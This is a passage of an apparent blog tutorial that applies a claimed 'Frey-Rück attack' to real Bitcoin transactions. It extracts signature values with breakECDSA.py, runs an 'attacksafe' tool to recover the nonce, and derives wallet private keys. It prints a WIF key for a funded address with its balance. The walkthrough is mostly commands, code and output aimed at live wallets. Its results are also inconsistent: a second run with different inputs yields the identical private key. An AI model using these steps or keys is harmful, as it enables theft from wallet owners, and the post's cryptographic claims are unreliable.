<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-45-1024x106.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-971"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff , 0x92718ef50eb3f5eb155a244e371194fb5086e58f1d174e88cda0a60a2ed899f7)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff
S = 0x649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1
Z = 0xb8e936d143c8733bb1ede19146f8725fee1d10bfc19e14452a51cef0cb0014d8</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff
point2gen  =   (0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff , 0x92718ef50eb3f5eb155a244e371194fb5086e58f1d174e88cda0a60a2ed899f7)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;.&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3
R = 0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff
S = 0x649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1
Z = 0xb8e936d143c8733bb1ede19146f8725fee1d10bfc19e14452a51cef0cb0014d8


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":978} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-48.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-978"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4faa01f7409813181fb5ae8d352796b791cd9df4ba0650df7008f5d9d6be8766</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG
WIF:  KytZsDHWSqKo9YuWTxwmM5D4g511TsLubF3pF7WgXfg3MTG1GfKa
HEX:  4faa01f7409813181fb5ae8d352796b791cd9df4ba0650df7008f5d9d6be8766</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":755} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/002.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-755"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":781,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-16-1024x449.png" alt="비트코인 블록체인 트랜잭션이 매우 취약한 경우 ECDSA 서명에서 비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격 구현" class="wp-image-781"/></a><figcaption class="wp-element-caption"><code><strong>www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</strong></code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 711.37</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>BTC 코인을 잃을 수 있는 잠재적인 위협은 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점에 있기 때문에 모든 사람이 항상 소프트웨어를 업데이트하고 검증된 장치만 사용할 것을 강력히 권장합니다.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>자세한 암호 분석을 통해 동일한 비트코인 ​​주소에 대해&nbsp;<a href="https://btc1.trezor.io/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128" target="_blank" rel="noreferrer noopener"><strong>81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128</strong></a>&nbsp;에서 치명적인 취약점도 발견했습니다.<strong><code>&nbsp;TXID:</code></strong><a href="https://btc1.trezor.io/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener">16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":771} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-15-1024x97.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-771"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 01000000011c2b74d4b3ccdd96201841bce8931efa4b40c0dcd11ce52bafe3167bc5c7f741120000006b483045022003af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644022100a66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000011c2b74d4b3ccdd96201841bce8931efa4b40c0dcd11ce52bafe3167bc5c7f741120000006b483045022003af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644022100a66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":975} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-47-1024x243.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-975"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644
S = 0xa66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a
Z = 0xb6d536f025718d424e97ea40e0a86eb32f3f7d3673c4d0decb1a71466235d4de</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>01000000011c2b74d4b3ccdd96201841bce8931efa4b40c0dcd11ce52bafe3167bc5c7f741120000006b483045022003af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644022100a66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":980} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-49-1024x318.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-980"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":986} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-51-1024x484.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-986"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226

RawTX = 01000000011c2b74d4b3ccdd96201841bce8931efa4b40c0dcd11ce52bafe3167bc5c7f741120000006b483045022003af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644022100a66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 사용해 봅시다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":989} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-52-1024x93.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-989"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644 , 0xa60ac25dfd96acce7456b5c16c8fcc5330988769558c09d36bf12ce2a9d369fc)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644
S = 0xa66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a
Z = 0xb6d536f025718d424e97ea40e0a86eb32f3f7d3673c4d0decb1a71466235d4de</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644
point2gen  =   (0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644 , 0xa60ac25dfd96acce7456b5c16c8fcc5330988769558c09d36bf12ce2a9d369fc)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;&nbsp;.&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226
R = 0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644
S = 0xa66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a
Z = 0xb6d536f025718d424e97ea40e0a86eb32f3f7d3673c4d0decb1a71466235d4de


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":991} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-53.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-991"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4faa01f7409813181fb5ae8d352796b791cd9df4ba0650df7008f5d9d6be8766</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG
WIF:  KytZsDHWSqKo9YuWTxwmM5D4g511TsLubF3pF7WgXfg3MTG1GfKa
HEX:  4faa01f7409813181fb5ae8d352796b791cd9df4ba0650df7008f5d9d6be8766</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":755} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/002.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-755"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":781,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-16-1024x449.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-781"/></a><figcaption class="wp-element-caption"><code><strong>www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</strong></code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 711.37</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><code>№2</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>자세한 암호 분석을 통해 Bitcoin 주소에서 치명적인 취약점도 발견했습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":649} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-3.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-649"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":651} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-4.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-651"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":790} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-17-1024x91.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-790"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 010000000128231a6d229f0dbea21477c631fd38d8c87159dc59b917bb822c4f593b5fba8e040000006a47304402203458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d0220445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d091301210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000128231a6d229f0dbea21477c631fd38d8c87159dc59b917bb822c4f593b5fba8e040000006a47304402203458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d0220445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d091301210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":994} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-54-1024x261.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-994"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d
S = 0x445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d0913
Z = 0x8b65d49dde9949e5ea18ae637d7f4f48c7c3b38957892a94a3bab994fec4eee7</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>010000000128231a6d229f0dbea21477c631fd38d8c87159dc59b917bb822c4f593b5fba8e040000006a47304402203458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d0220445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d091301210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

